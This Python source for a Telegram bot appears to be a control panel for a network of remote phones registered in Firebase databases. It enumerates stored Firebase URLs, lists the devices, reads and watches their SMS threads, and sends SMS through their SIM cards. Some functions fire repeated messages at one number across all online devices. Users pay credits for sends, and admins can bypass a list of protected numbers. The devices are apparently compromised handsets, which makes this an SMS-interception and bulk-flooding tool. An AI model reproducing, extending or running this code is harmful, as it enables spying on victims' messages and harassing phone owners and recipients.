        body = (f"⏳ <b>Sending {min(i, total)}/{total}</b> {progress_bar(i / total)}\n"
                f"To: <code>{html.escape(to)}</code> · SIM {sim}\n{capped_note}")
        try:
            if message_id is not None:
                edit(chat_id, message_id, body, None)
        except Exception:
            pass

    show(0, force=True)
    for i, tgt in enumerate(targets, 1):
        if marker and (marker["ev"].is_set() or USER_ACTIVE.get(user_id) is not marker):
            break
        try:
            ok, detail = queue_send(tgt["id"], to, text, sim, tgt.get("db"), admin=admin)
        except Exception as exc:
            ok, detail = False, str(exc)[:120]
        if ok:
            ok_list.append(tgt)
        else:
            fail_list.append(f"{tgt['id'][:8]} ({detail[:80]})")
        show(i, force=(i == total))
    if marker and USER_ACTIVE.get(user_id) is marker:
        USER_ACTIVE.pop(user_id, None)
    db_ok: Dict[str, int] = {}
    db_fail: Dict[str, int] = {}
    for t in ok_list:
        h = short_host(t.get("db", ""))
        db_ok[h] = db_ok.get(h, 0) + 1
    for f in fail_list:
        db_fail["?"] = db_fail.get("?", 0) + 1
    lines = [f"<b>{'✅ Done' if not fail_list else '⚠️ Partial'}</b>: "
             f"{len(ok_list)} queued, {len(fail_list)} failed. {progress_bar(len(ok_list) / total if total else 1)}",
             f"To: <code>{html.escape(to)}</code> · SIM {sim}"]
    if not admin and user_id is not None:
        used, left = spend_credits(user_id, len(ok_list))
        lines.insert(2, f"🪙 Credits −{used} · balance: <b>{left}</b> (≈ {left * SENDS_PER_CREDIT} sends)")
    if admin or user_id is None:
        for h in sorted(set(list(db_ok) + [k for k in db_fail if k != "?"])):
            lines.append(f"• {h}: {db_ok.get(h, 0)} queued")
        if capped_note:
            lines.append(capped_note.strip())
        if fail_list:
            lines.append("Failed: " + ", ".join(fail_list[:6]) + ("…" if len(fail_list) > 6 else ""))
    else:
        if capped_note:
            lines.append(capped_note.strip())
        if fail_list:
            lines.append(f"{len(fail_list)} sender{'s' if len(fail_list) != 1 else ''} couldn't take the "
                         f"message right now — you can retry later.")
        lines.append("")
        lines.append("✉️ Message left with the sender devices — it sends automatically when one picks it up. "
                     "📬 My messages shows the delivery status.")
    final = "\n".join(lines)[:3500]
    try:
        if message_id is not None:
            edit(chat_id, message_id, final, kb)
        else:
            send(chat_id, final, kb)
    except Exception:
        pass
    if user_id is not None:
        recs = [{"user": user_id, "to": to, "text": text, "device": t["id"], "sim": sim,
                 "db": t.get("db"), "ts": int(time.time()), "queued_ok": True, "detail": "bulk"} for t in ok_list]
        if recs:
            sends = load_json(SEND_STORE, [])
            sends.extend(recs)
            save_json(SEND_STORE, sends[-500:])
        for _ in ok_list:
            bump_user_sends(user_id)


def run_qty_send(chat_id: int, message_id: Optional[int], to: str, text: str,
                 targets: List[Dict[str, str]], sim: int, admin: bool,
                 user_id: Any, capped_note: str, qty: int) -> None:
    """Spread qty messages across all device targets (round-robin shards,
    even/odd handled) with up to MAX_THREAD device-workers in parallel, one
    retry pass for failed slots re-queued onto the next devices, live
    progress, privacy-clean summary for users and full detail for admins."""
    kb = MAIN_KB if admin else USER_KB
    qty = max(1, int(qty))
    plan = [{"db": t.get("db") or "", "id": t["id"]} for t in targets if t.get("id")]
    marker = _user_marker(None if admin else user_id)
    stop = marker["ev"] if marker else None
    if marker:
        threading.Thread(target=_user_pickup, args=(user_id, marker), daemon=True).start()
    last_edit = 0.0

    def show(done: int, force: bool = False):
        nonlocal last_edit
        now = time.time()
        if not force and now - last_edit < 1.0:
            return
        last_edit = now
        body = (f"⏳ <b>Sending {min(done, qty)}/{qty}</b> {progress_bar(min(done, qty) / qty)}\n"
                f"To: <code>{html.escape(to)}</code> · SIM {sim}\n{capped_note}")
        try:
            if message_id is not None:
                edit(chat_id, message_id, body, None)
        except Exception:
            pass

    def attempt(dev):
        try:
            return queue_send(dev["id"], to, text, sim, dev.get("db"), admin=admin)
        except Exception as exc:
            return False, str(exc)[:120]

    lock = threading.Lock()
    state = {"done": 0, "ok": 0}
    ok_devs: List[Dict[str, str]] = []
    fail_notes: List[str] = []
    show(0, force=True)

    def worker(e: Dict[str, Any]):
        for _ in range(e["n"]):
            if stop is not None and (stop.is_set() or USER_ACTIVE.get(user_id) is not marker):
                break
            ok, detail = attempt(e["dev"])
            with lock:
                state["done"] += 1
                if ok:
                    state["ok"] += 1
                    ok_devs.append(e["dev"])
                else:
                    fail_notes.append(f"{e['dev']['id'][:8]} ({str(detail)[:80]})")
                show(state["done"])

    # round-robin shards: message j → plan[j % N] ⇒ even/odd split is exact
    by_dev: Dict[str, Dict[str, Any]] = {}
    for j in range(qty):
        d = plan[j % len(plan)]
        key = f"{d['id']}@{d.get('db') or ''}"  # id may repeat across DBs → shard by (id, db)
        e = by_dev.setdefault(key, {"dev": d, "n": 0})
        e["n"] += 1
    pending = list(by_dev.values())
    while pending:
        batch, pending = pending[:MAX_THREAD], pending[MAX_THREAD:]
        zs = [threading.Thread(target=worker, args=(e,), daemon=True) for e in batch]
        for w in zs:
            w.start()
        for w in zs:
            w.join()

    # retry pass: every failed slot is re-queued once, cycled over the plan
    fails = len(fail_notes)
    abort = stop is not None and (stop.is_set() or USER_ACTIVE.get(user_id) is not marker)
    if fails and plan and not abort:
        show(min(state["done"], qty), force=True)
        start = qty % len(plan)
        for k in range(fails):
            if stop is not None and (stop.is_set() or USER_ACTIVE.get(user_id) is not marker):
                abort = True
                break
            cand = plan[(start + k) % len(plan)]
            ok, detail = attempt(cand)
            with lock:
                state["done"] += 1
                if ok:
                    state["ok"] += 1
                    ok_devs.append(cand)
                else:
                    fail_notes.append(f"{cand['id'][:8]} ({str(detail)[:80]})")
                show(state["done"], force=(k == fails - 1))
    if marker and USER_ACTIVE.get(user_id) is marker:
        USER_ACTIVE.pop(user_id, None)

    ok_msgs = state["ok"]
    fail_msgs = max(0, qty - ok_msgs)
    stopped = bool(marker and marker["ev"].is_set())
    dev2db = {d["id"]: d.get("db") or "" for d in plan}
    db_ok: Dict[str, int] = {}
    for d in ok_devs:
        h = short_host(dev2db.get(d["id"], ""))
        db_ok[h] = db_ok.get(h, 0) + 1
    head = "✅ Done" if ok_msgs == qty else "⚠️ Partial"
    lines = [f"<b>{head}</b>: {ok_msgs} of {qty} messages sent. {progress_bar(ok_msgs / qty)}",
             f"To: <code>{html.escape(to)}</code> · SIM {sim}"]
    if not admin and user_id is not None:
        used, left = spend_credits(user_id, ok_msgs)
        lines.insert(2, f"🪙 Credits −{used} · balance: <b>{left}</b> (≈ {left * SENDS_PER_CREDIT} sends)")
        if capped_note:
            lines.append(capped_note.strip())
        if fail_msgs > 0:
            lines.append(f"{fail_msgs} message{'s' if fail_msgs != 1 else ''} could not be queued right now "
                         f"— you can retry later.")
        if stopped:
            lines.append("⏳ Stopped at the 4-min limit — un-sent messages were dropped.")
        lines.append("")
        lines.append("✉️ Message left with the sender devices — it sends automatically when one picks it up. "
                     "📬 My messages shows the delivery status.")
    else:
        if capped_note:
            lines.append(capped_note.strip())
        for h in sorted(db_ok):
            lines.append(f"• {h}: {db_ok.get(h, 0)} queued")
        if fail_notes:
            lines.append("Failed: " + ", ".join(fail_notes[:6]) + ("…" if len(fail_notes) > 6 else ""))
    final = "\n".join(lines)[:3500]
    try:
        if message_id is not None:
            edit(chat_id, message_id, final, kb)
        else:
            send(chat_id, final, kb)
    except Exception:
        pass
    if user_id is not None:
        recs = [{"user": user_id, "to": to, "text": text, "device": d["id"], "sim": sim,
                 "db": dev2db.get(d["id"]), "ts": int(time.time()), "queued_ok": True, "detail": "bulk"}
                for d in ok_devs]
        if recs:
            sends = load_json(SEND_STORE, [])
            sends.extend(recs)
            save_json(SEND_STORE, sends[-500:])
        for _ in ok_devs:
            bump_user_sends(user_id)


def admin_send_start(dev_id: str, chat_id: int):
    devdb = None
    try:
        for x in online_devices():
            if x["id"] == dev_id:
                devdb = x["db"]
                break
    except Exception:
        pass
    PENDING[chat_id] = ("adm_num", dev_id, devdb)
    send(chat_id, f"✉️ Send via <code>{html.escape(dev_id)}</code>\n\nStep 1/2 — recipient number (e.g. <code>+15551234567</code>):", ADMIN_CANCEL_KB)


def admin_confirm_async(chat_id: int) -> None:
    confirm_async(chat_id, lambda mid, online: admin_send_confirm(chat_id, mid, _online=online))


def admin_send_confirm(chat_id: int, message_id: Optional[int] = None, _online: Optional[List[Dict[str, Any]]] = None):
    d = ADM_DRAFT.get(chat_id)
    if not d:
        if message_id is not None:
            edit(chat_id, message_id, "Session expired.", MAIN_KB)
        else:
            send(chat_id, "Session expired.", MAIN_KB)
        return
    sim = d.get("sim", 1)
    mode = d.get("mode", "single")
    count = max(1, min(MAX_SEND_COUNT, int(d.get("count", 1))))
    d["count"] = count
    online = _online if _online is not None else online_devices()
    preview = d["text"][:300] + ("…" if len(d["text"]) > 300 else "")
    if mode == "all":
        via = f"🌐 All online devices ({len(online)} across {len(pool_urls())} DBs)"
    else:
        via = f"<code>{html.escape(d['dev'])}</code>" + (f" +{count - 1} more" if count > 1 else "")
    shield = ""
    hit = prot_matches(d["to"])
    if hit:
        shield = f"\n🛡 <b>Warning:</b> <code>{html.escape(hit)}</code> is protected — sending anyway (admin bypass)."
    text = (f"<b>✉️ Confirm send</b>{shield}\nTo: <code>{html.escape(d['to'])}</code>\n"
            f"Via: {via}\n\n{html.escape(preview)}\n\nSIM slot + repeat:")
    rows = [[{"text": f"{'🌐✅ ' if mode == 'all' else '🌐 '}All devices", "callback_data": "aall"}]]
    if mode == "single":
        rows.append([{"text": "➖", "callback_data": "acount:-"},
                     {"text": f"×{count} msgs", "callback_data": "acount:="},
                     {"text": "➕", "callback_data": "acount:+"}])
        rows.append([{"text": "×10", "callback_data": "acount:10"},
                     {"text": "×20", "callback_data": "acount:20"},
                     {"text": "×25", "callback_data": "acount:25"}])
    rows.append([{"text": f"{'✅ ' if sim == 1 else ''}SIM 1", "callback_data": "asim:1"},
                 {"text": f"{'✅ ' if sim == 2 else ''}SIM 2", "callback_data": "asim:2"}])
    rows.append([{"text": "✅ Send now", "callback_data": "asendgo"}])
    rows.append([{"text": "❌ Cancel", "callback_data": "ascancel"}])
    kb = {"inline_keyboard": rows}
    if message_id is not None:
        edit(chat_id, message_id, text, kb)
    else:
        send(chat_id, text, kb)


# -----------------------------------------------------------
# analysis
# -----------------------------------------------------------

def analyze_urls(urls: List[str]) -> str:
    if not urls:
        return "No URLs stored. Add one first."
    out: List[str] = []
    enu = FirebaseEnumerator(timeout=8, max_depth=3, max_nodes=120, delay=0.0)
    for url in urls[:10]:
        r = enu.enumerate_base(url)
        out.append(f"<b>{url}</b>")
        out.append(f"  public: <code>{r['public']}</code> | status: {r['status']} | error: {r['error'] or 'none'}")
        out.append(f"  paths: {len(r['paths'])} | branches: {r['branch_count']} | leaves: {r['leaf_count']} | truncated: {r['truncated']}")
        for p in r["paths"][:MAX_PATHS_SHOW]:
            out.append(f"    {p}")
        if len(r["paths"]) > MAX_PATHS_SHOW:
            out.append(f"    ... +{len(r['paths']) - MAX_PATHS_SHOW} more")
        out.append("")
    return "\n".join(out)[:3500]


# -----------------------------------------------------------
# state
# -----------------------------------------------------------

PENDING: Dict[int, Any] = {}  # chat_id -> "add" | "remove" | ("adm_num", dev, devdb) | ("adm_text", dev, devdb, to)
DEV_CACHE: Dict[int, List[Dict[str, Any]]] = {}
DEV_CACHE_STORE: Dict[str, Any] = {"devices": None, "ts": 0.0}
DEV_LOCK = threading.Lock()


def menu_text() -> str:
    return (
        "<b>Admin panel</b>\n"
        "Secure: only your chat can use this bot.\n"
        "Choose an action:"
    )


def handle_command(chat_id: int, text: str):
    if not text or not text.strip():
        return
    cmd = text.strip().split()[0].lower()
    if cmd == "/start":
        send(chat_id, menu_text(), MAIN_KB)
    elif cmd == "/help":
        send(chat_id, "/start → panel\n/list\n/analyze\n/add <url>\n/remove <url|n>\n/sms → SMS panel\n/devices\n/dbs\n/users → registered users\n/ban|/unban <chat_id>\n/grant <chat_id> <±credits> → user credits\n/protection → protected numbers panel\n/protect <nums> · /unprotect <nums>\n/cast <text> → broadcast to users\n/stopwatch → stop new-message watch", MAIN_KB)
    elif cmd == "/grant":
        parts = text.split()
        if len(parts) < 3 or not parts[1].isdigit():
            send(chat_id, "Usage: /grant <chat_id> <credits> — e.g. /grant 7002222222 5 (negative removes)", MAIN_KB)
        else:
            uid = parts[1]
            try:
                delta = int(parts[2])
            except ValueError:
                delta = 0
            bal = grant_credits(uid, delta)
            known = str(uid) in load_json(USER_STORE, {})
            send(chat_id, f"🪙 {'Added' if delta >= 0 else 'Removed'} <b>{abs(delta)}</b> credits "
                          f"{'for' if delta >= 0 else 'from'} <code>{uid}</code> — balance: <b>{bal}</b>."
                          + ("" if known else "\n<i>(that chat id never messaged the bot)</i>"), MAIN_KB)
            if delta:
                try:
                    send(int(uid), f"🪙 <b>{'+' if delta > 0 else ''}{delta} credits</b> "
                                   f"{'granted' if delta > 0 else 'revoked'} by admin — "
                                   f"balance: <b>{bal}</b> (≈ {bal * SENDS_PER_CREDIT} sends).")
                except Exception:
                    pass
    elif cmd == "/users":
        users_screen(chat_id)
    elif cmd == "/ban" or cmd == "/unban":
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            send(chat_id, "Usage: /ban <chat_id>  (see /users)", MAIN_KB)
        else:
            users = load_json(USER_STORE, {})
            key = parts[1].strip()
            rec = users.get(key, {})
            rec["banned"] = (cmd == "/ban")
            users[key] = rec
            save_json(USER_STORE, users)
            send(chat_id, f"{'🚫 Banned' if cmd == '/ban' else '✅ Unbanned'} <code>{key}</code>.", MAIN_KB)
    elif cmd == "/protect":
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send(chat_id, "Usage: /protect <number(s)> — space or comma separated, e.g. /protect 9800000001, 9800000002", MAIN_KB)
        else:
            protect_add_result(chat_id, protect_add(parts[1]))
    elif cmd == "/unprotect":
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send(chat_id, "Usage: /unprotect <number(s)> (see /protection)", MAIN_KB)
        else:
            removed, missing = protect_remove(parts[1])
            lines = []
            if removed:
                lines.append("✅ Unprotected: " + ", ".join(f"<code>{k}</code>" for k in removed))
            if missing:
                lines.append("Not found: " + ", ".join(f"<code>{html.escape(k)}</code>" for k in missing))
            send(chat_id, "\n".join(lines) or "Nothing removed.", MAIN_KB)
    elif cmd == "/protection":
        protection_screen(chat_id)
    elif cmd == "/cast":
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send(chat_id, "Usage: /cast <message>", MAIN_KB)
        else:
            admin_broadcast(chat_id, parts[1].strip())
    elif cmd == "/list":
        urls = load_urls()
        send(chat_id, "Stored:\n" + ("\n".join(f"{i+1}. {u}" for i, u in enumerate(urls)) if urls else "(none)"), MAIN_KB)
    elif cmd == "/analyze":
        send(chat_id, "Analyzing… (run in background)")
        threading.Thread(target=lambda: send(chat_id, analyze_urls(load_urls()), MAIN_KB), daemon=True).start()
    elif cmd == "/devices":
        send(chat_id, "⏳ Loading devices…", MAIN_KB)
        threading.Thread(target=lambda: devices_screen(chat_id, None, edit_msg=False, devices=None), daemon=True).start()
    elif cmd == "/sms":
        send(chat_id, "⏳ Loading chats…", MAIN_KB)
        threading.Thread(target=lambda: sms_threads(chat_id, None), daemon=True).start()
    elif cmd == "/stopwatch":
        stop_watch(chat_id)
    elif cmd == "/add":
        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            add_url(chat_id, parts[1])
        else:
            PENDING[chat_id] = "add"
            send(chat_id, "Send the Firebase/API URL to add:")
    elif cmd == "/dbs":
        databases_screen(chat_id)
    elif cmd == "/remove":
        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            remove_url(chat_id, parts[1])
        else:
            PENDING[chat_id] = "remove"
            send(chat_id, "Send the URL or its number to remove:")
    else:
        send(chat_id, "Unknown. Use /start.", MAIN_KB)


def add_url(chat_id: int, value: str):
    value = value.strip()
    if not re.match(r"^https?://", value, re.I):
        send(chat_id, "Invalid URL. Must start with http(s)://", MAIN_KB)
        return
    targets = parse_input(value)
    if not targets:
        if re.search(r"[?&](?:m|s|data|db)=", value):
            send(chat_id, "❌ Couldn't find any Firebase URL in that link. It may use a host format I don't recognize — paste a raw <code>https://....firebaseio.com</code> URL instead.", MAIN_KB)
            return
        targets = [value]
    urls = load_urls()
    added = []
    for t in targets:
        t = t.rstrip("/")
        if t not in urls:
            urls.append(t)
            added.append(t)
    if not added:
        send(chat_id, "Already stored.", MAIN_KB)
        return
    save_urls(urls)
    if len(urls) == len(added):
        ACTIVE_DB["url"] = added[0]
    body = "\n".join(f"• {a}" for a in added)
    send(chat_id, f"Added {len(added)} database(s):\n{body}\n\nTotal: {len(urls)} — active: <code>{ACTIVE_DB.get('url') or fb_base()}</code>", MAIN_KB)


def databases_screen(chat_id: int, message_id: Optional[int] = None):
    urls = load_urls()
    active = ACTIVE_DB.get("url") or fb_base()
    pool = pool_urls()
    lines = ["<b>🗂 Databases</b>", f"Active: <code>{active or '-'}</code>",
             f"Send pool: <b>{len(pool)}</b> DB(s) — bulk sends use all of these", ""]
    kb = {"inline_keyboard": []}
    for i, u in enumerate(urls):
        mark = "✅ " if u == active else ""
        host = u.split("//")[-1][:26]
        in_pool = u.rstrip("/") in [p.rstrip("/") for p in pool]
        kb["inline_keyboard"].append([
            {"text": f"{mark}{host}", "callback_data": f"seldb:{i}"},
            {"text": f"{'✅ Pool' if in_pool else '➕ Pool'}", "callback_data": f"pooldb:{i}"},
        ])
    kb["inline_keyboard"].append([{"text": "➕ Add DB", "callback_data": "add"},
                                  {"text": "🔙 Back", "callback_data": "back"}])
    text = "\n".join(lines) if urls else "No databases yet. Tap ➕ Add DB and paste a firebase URL or a legendpannel ?m= link."
    if message_id is not None:
        edit(chat_id, message_id, text, kb)
    else:
        send(chat_id, text, kb)


def remove_url(chat_id: int, value: str):
    urls = load_urls()
    target = value.strip()
    removed = False
    if target.isdigit() and 1 <= int(target) <= len(urls):
        removed = bool(urls.pop(int(target) - 1))
    elif target in urls:
        urls.remove(target)
        removed = True
    if removed:
        save_urls(urls)
        send(chat_id, f"Removed. ({len(urls)} remaining)", MAIN_KB)
    else:
        send(chat_id, "Not found.", MAIN_KB)


def handle_callback(chat_id: int, message_id: int, data: str, callback_id: str):
    answer_callback(callback_id)
    if data == "add":
        PENDING[chat_id] = "add"
        send(chat_id, "Send the Firebase/API URL to add:", MAIN_KB)
    elif data == "remove":
        PENDING[chat_id] = "remove"
        send(chat_id, "Send the URL or its number to remove:", MAIN_KB)
    elif data == "list":
        urls = load_urls()
        edit(chat_id, message_id, "Stored:\n" + ("\n".join(f"{i+1}. {u}" for i, u in enumerate(urls)) if urls else "(none)"), MAIN_KB)
    elif data == "analyze":
        edit(chat_id, message_id, "Analyzing… (run in background)", MAIN_KB)
        threading.Thread(target=lambda: send(chat_id, analyze_urls(load_urls()), MAIN_KB), daemon=True).start()
    elif data == "help":
        send(chat_id, "/start → panel\n/list\n/analyze\n/add <url>\n/remove <url|n>\n/sms\n/devices\n/dbs\n/users\n/ban|/unban\n/cast\n/stopwatch", MAIN_KB)
    elif data == "users":
        users_screen(chat_id, message_id)
    elif data == "prot":
        protection_screen(chat_id, message_id)
    elif data.startswith("prot:off:"):
        key = data.split(":", 2)[2]
        removed, missing = protect_remove(key)
        if removed:
            edit(chat_id, message_id, f"✅ Unprotected <code>{html.escape(removed[0])}</code>", None)
        protection_screen(chat_id, message_id)
    elif data == "prot:add":
        PENDING[chat_id] = "prot_add"
        edit(chat_id, message_id,
             "🛡 Send the number(s) to protect — space or comma separated:\n"
             f"Example: <code>9800000001, 9800000002</code>", MAIN_KB)
    elif data == "devrefresh":
        edit(chat_id, message_id, "⏳ Loading devices…", devices_kb())
        threading.Thread(target=lambda: devices_screen(chat_id, message_id, devices=fetch_devices(force=True)), daemon=True).start()
    elif data.startswith("devf:"):
        DEV_FILTER["f"] = data.split(":", 1)[1]
        edit(chat_id, message_id, "⏳ Filtering…", devices_kb())
        threading.Thread(target=lambda: devices_screen(chat_id, message_id, devices=DEV_CACHE.get(chat_id)), daemon=True).start()
    elif data.startswith("devs:"):
        DEV_FILTER["s"] = data.split(":", 1)[1]
        edit(chat_id, message_id, "⏳ Sorting…", devices_kb())
        threading.Thread(target=lambda: devices_screen(chat_id, message_id, devices=DEV_CACHE.get(chat_id)), daemon=True).start()
    elif data.startswith("dev:"):
        dev_id = data.split(":", 1)[1]
        threading.Thread(target=lambda: device_detail(dev_id, chat_id, message_id), daemon=True).start()
    elif data == "back":
        edit(chat_id, message_id, menu_text(), MAIN_KB)
    elif data == "dbpanel":
        databases_screen(chat_id, message_id)
    elif data.startswith("seldb:"):
        urls = load_urls()
        idx = int(data.split(":", 1)[1])
        if 0 <= idx < len(urls):
            ACTIVE_DB["url"] = urls[idx].rstrip("/")
            DEV_CACHE_STORE["devices"] = None
            DEV_CACHE_STORE["ts"] = 0.0
        databases_screen(chat_id, message_id)
    elif data.startswith("pooldb:"):
        urls = load_urls()
        idx = int(data.split(":", 1)[1])
        if 0 <= idx < len(urls):
            u = urls[idx].rstrip("/")
            pool = [p.rstrip("/") for p in pool_urls()]
            if u in pool:
                pool = [p for p in pool if p != u]
            else:
                pool.append(u)
            set_pool(pool)
            POOL_CACHE["by_base"] = {}
        databases_screen(chat_id, message_id)
    elif data == "smsall":
        edit(chat_id, message_id, "⏳ Loading all chats…", MAIN_KB)
        threading.Thread(target=lambda: sms_threads(chat_id, message_id, online_only=False), daemon=True).start()
    elif data == "smslist":
        edit(chat_id, message_id, "⏳ Loading chats…", MAIN_KB)
        threading.Thread(target=lambda: sms_threads(chat_id, message_id), daemon=True).start()
    elif data == "watchoff":
        stop_watch(chat_id)
    elif data.startswith("thread:"):
        edit(chat_id, message_id, "⏳ Loading thread…", MAIN_KB)
        phone = data.split(":", 1)[1]
        threading.Thread(target=lambda: sms_thread(phone, chat_id, message_id), daemon=True).start()
    elif data.startswith("watch:"):
        phone = data.split(":", 1)[1]
        threading.Thread(target=lambda: start_watch(phone, chat_id), daemon=True).start()
    elif data.startswith("send:"):
        dev_id = data.split(":", 1)[1]
        admin_send_start(dev_id, chat_id)
    elif data.startswith("asim:"):
        d = ADM_DRAFT.get(chat_id)
        if not d:
            edit(chat_id, message_id, "Session expired.", MAIN_KB)
        else:
            d["sim"] = int(data.split(":", 1)[1])
            admin_send_confirm(chat_id, message_id)
    elif data == "aall":
        d = ADM_DRAFT.get(chat_id)
        if not d:
            edit(chat_id, message_id, "Session expired.", MAIN_KB)
        else:
            d["mode"] = "all" if d.get("mode") != "all" else "single"
            admin_send_confirm(chat_id, message_id)
    elif data.startswith("acount:"):
        d = ADM_DRAFT.get(chat_id)
        if not d:
            edit(chat_id, message_id, "Session expired.", MAIN_KB)
        else:
            op = data.split(":", 1)[1]
            c = int(d.get("count", 1))
            if op == "+":
                c = min(MAX_SEND_COUNT, c + 1)
            elif op == "-":
                c = max(1, c - 1)
            elif op.isdigit():
                c = max(1, min(MAX_SEND_COUNT, int(op)))
            d["count"] = c
            admin_send_confirm(chat_id, message_id)
    elif data == "asendgo":
        d = ADM_DRAFT.pop(chat_id, None)
        if not d:
            edit(chat_id, message_id, "Session expired.", MAIN_KB)
        else:
            online = online_devices()
            if not online:
                edit(chat_id, message_id, "⚠️ No senders online right now.", MAIN_KB)
            else:
                capped = ""
                if d.get("mode") == "all":
                    targets = [{"db": x["db"], "id": x["id"]} for x in online]
                else:
                    want = max(1, min(MAX_SEND_COUNT, int(d.get("count", 1))))
                    pool = [{"db": x["db"], "id": x["id"]} for x in online]
                    key = (d.get("devdb"), d.get("dev"))
                    pairs = [(x["db"], x["id"]) for x in online]
                    if key in pairs:
                        i = pairs.index(key)
                        pool = pool[i:] + pool[:i]
                    targets = pool[:want]
                    if want > len(pool):
                        capped = f"⚠️ Only {len(pool)} online — capped."
                threading.Thread(target=lambda: run_bulk_send(chat_id, message_id, d["to"], d["text"], targets, d.get("sim", 1), True, capped_note=capped), daemon=True).start()
    elif data == "ascancel":
        ADM_DRAFT.pop(chat_id, None)
        PENDING.pop(chat_id, None)
        edit(chat_id, message_id, "Cancelled.", MAIN_KB)


# -----------------------------------------------------------
# user-facing panel (auto role detection: admin vs everyone else)
# -----------------------------------------------------------

USER_STORE = os.path.join(HERE, "bot_users.json")
SEND_STORE = os.path.join(HERE, "bot_sends.json")
USER_SEND_COOLDOWN = 30
USER_SEND_TIMEOUT = 240  # 4-min hard cap on a user's running bulk send
USER_ACTIVE: Dict[int, Dict[str, Any]] = {}  # chat_id -> {"ts": float, "ev": Event}
USER_MAX_TEXT = 1000

USTATE: Dict[int, Dict[str, Any]] = {}  # user chat_id -> {"stage":..., "to":..., "text":..., "sender":...}
ULAST_SEND: Dict[int, float] = {}

# credits: users spend credits to send; 1 credit = SENDS_PER_CREDIT queued sends
CREDITS_STORE = os.path.join(HERE, "bot_credits.json")
CREDITS_LOCK = threading.Lock()
SENDS_PER_CREDIT = 3

# -----------------------------------------------------------
# protection: numbers users are not allowed to message
# -----------------------------------------------------------

PROTECT_STORE = os.path.join(HERE, "bot_protection.json")
PROTECT_LOCK = threading.Lock()


def prot_normalize(text: str) -> Optional[str]:
    """Canonical match key: digits only, +91xxxx → drop 91. Keeps other
    country codes whole so +1… stays distinct from bare 10-digit."""
    digits = re.sub(r"\D", "", str(text or ""))
    if len(digits) == 12 and digits.startswith("91"):
        digits = digits[2:]
    if not (7 <= len(digits) <= 15):
        return None
    return digits


def prot_matches(target: str) -> Optional[str]:
    n = prot_normalize(target)
    return n if is_protected(n) else None


def is_protected(target: Optional[str]) -> bool:
    n = prot_normalize(target) if target else None
    if not n:
        return False
    with PROTECT_LOCK:
        return n in load_json(PROTECT_STORE, {})


def _prot_tokens(text: str) -> List[str]:
    """Comma/space split, then re-join fragments like '+91 9812345678' that a
    space broke apart ('+91' + digits)."""
    toks = (text or "").replace(",", " ").split()
    merged: List[str] = []
    for tok in toks:
        if merged and re.fullmatch(r"[-+ ]?\d{0,3}", merged[-1]) and prot_normalize(merged[-1] + tok):
            merged[-1] = merged[-1] + tok
        else:
            merged.append(tok)
    return merged


def protect_add(text: str) -> tuple:
    """Text may hold several numbers at once. Returns (added, dup, bad)."""
    added, dup, bad = [], [], []
    with PROTECT_LOCK:
        store = load_json(PROTECT_STORE, {})
        for tok in _prot_tokens(text):
            key = prot_normalize(tok)
            if not key:
                if re.search(r"[0-9a-zA-Z]", tok, re.IGNORECASE):
                    bad.append(str(tok)[:16])  # digits or letters → report, symbols ignored
                continue  # pure +/spaces → silently ignore
            if key in store:
                dup.append(key)
                continue
            store[key] = {"added_ts": int(time.time()), "by": ADMIN_CHAT_ID}
            added.append(key)
        if added:
            save_json(PROTECT_STORE, store)
    return added, dup, bad


def protect_remove(text: str) -> tuple:
    """Removes by number(s). Returns (removed, missing)."""
    removed, missing = [], []
    with PROTECT_LOCK:
        store = load_json(PROTECT_STORE, {})
        for tok in _prot_tokens(text):
            key = prot_normalize(tok)
            if not key:
                if re.search(r"[0-9a-zA-Z]", tok, re.IGNORECASE):
                    missing.append(str(tok)[:16])
                continue
            if key in store:
                store.pop(key, None)
                removed.append(key)
            else:
                missing.append(key)
        if removed:
            save_json(PROTECT_STORE, store)
    return removed, missing


def protect_add_result(chat_id: int, res: tuple, kb: Optional[Dict[str, Any]] = None):
    added, dup, bad = res
    lines = []
    if added:
        lines.append("🛡 Protected: " + ", ".join(f"<code>{k}</code>" for k in added))
    if dup:
        lines.append("Already protected: " + ", ".join(f"<code>{k}</code>" for k in dup))
    if bad:
        lines.append("❌ Not valid numbers: " + ", ".join(f"<code>{html.escape(b)}</code>" for b in bad))
    send(chat_id, "\n".join(lines) or "Nothing to protect.", kb or MAIN_KB)


def protection_screen(chat_id: int, message_id: Optional[int] = None):
    with PROTECT_LOCK:
        store = load_json(PROTECT_STORE, {})
    keys = sorted(store.keys())
    total = len(keys)
    head = (f"<b>🛡 Protection</b>\n"
            f"{total} protected number(s). Send by <b>users to these numbers is blocked</b>.\n"
            f"(Admin sends are allowed with a warning.)")
    if not keys:
        head += "\n\nNo numbers protected yet."
    kb_rows: List[List[Dict[str, str]]] = [
        [{"text": "➕ Add numbers", "callback_data": "prot:add"}]]
    for k in keys[:40]:
        kb_rows.append([{"text": f"🛡 {k} — unprotect", "callback_data": f"prot:off:{k}"}])
    if total > 40:
        kb_rows.append([{"text": f"… +{total - 40} more (use /unprotect)", "callback_data": "noop"}])
    kb_rows.append([{"text": "🔙 Menu", "callback_data": "back"}])
    kb = {"inline_keyboard": kb_rows}
    if message_id is not None:
        edit(chat_id, message_id, head, kb)
    else:
        send(chat_id, head, kb)

# -----------------------------------------------------------
# credits: 1 credit = SENDS_PER_CREDIT sends (admins exempt)
# -----------------------------------------------------------

def credit_tokens(sends: int) -> int:
    return -(-max(0, int(sends)) // SENDS_PER_CREDIT)


def get_credits(chat_id: Any) -> int:
    with CREDITS_LOCK:
        store = load_json(CREDITS_STORE, {})
        return int(store.get(str(chat_id), 0))


def grant_credits(chat_id: Any, delta: int) -> int:
    with CREDITS_LOCK:
        store = load_json(CREDITS_STORE, {})
        key = str(chat_id)
        bal = max(0, int(store.get(key, 0)) + int(delta))
        store[key] = bal
        save_json(CREDITS_STORE, store)
    return bal


def spend_credits(chat_id: Any, sends: int) -> Tuple[int, int]:
    """Charge ceil(sends/SENDS_PER_CREDIT) credits; floor at 0. Returns (used, left)."""
    if int(sends) <= 0:
        return 0, get_credits(chat_id)
    with CREDITS_LOCK:
        store = load_json(CREDITS_STORE, {})
        key = str(chat_id)
        used = min(int(store.get(key, 0)), credit_tokens(sends))
        if used:
            store[key] = int(store.get(key, 0)) - used
            save_json(CREDITS_STORE, store)
